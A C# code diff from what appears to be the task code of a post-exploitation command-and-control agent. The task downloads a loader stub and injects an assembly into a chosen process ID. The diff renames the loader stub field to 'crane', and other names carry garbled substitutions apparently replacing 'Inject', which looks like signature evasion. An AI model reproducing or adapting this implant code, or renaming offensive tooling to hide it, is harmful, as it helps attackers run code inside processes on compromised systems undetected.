@@ -34,8 +34,8 @@ namespace Tasks
             public string AssemblyId;
             [DataMember(Name = "assembly_arguments")]
             public string AssemblyArguments;
-            [DataMember(Name = "loader_stub_id")]
-            public string LoaderStubId;
+            [DataMember(Name = "crane_stub_id")]
+            public string craneStubId;
             [DataMember(Name = "pid")]
             public int PID;
         }
@@ -108,7 +108,7 @@ namespace Tasks
             try
             {
                 AssemblytoppParameters parameters = _jsonSerializer.Deserialize<AssemblytoppParameters>(_data.Parameters);
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
+                if (string.IsNullOrEmpty(parameters.craneStubId) ||
                     string.IsNullOrEmpty(parameters.AssemblyName) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -145,7 +145,7 @@ namespace Tasks
                                 _agent.GetFileManager().AddFileToStore(parameters.AssemblyName, assemblyBytes);
                             }
                         }
-                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
+                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.craneStubId,
                                 out byte[] exeAsmPic))
                         {
                             var toppor = _agent.GettoppionManager().CreateInstance(exeAsmPic, parameters.PID);
@@ -197,7 +197,7 @@ namespace Tasks
                         else
                         {
                             resp = CreateTaskResponse(
-                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
+                                $"Failed to download assembly crane stub (with id: {parameters.craneStubId})",
                                 true,
                                 "error");
                         }
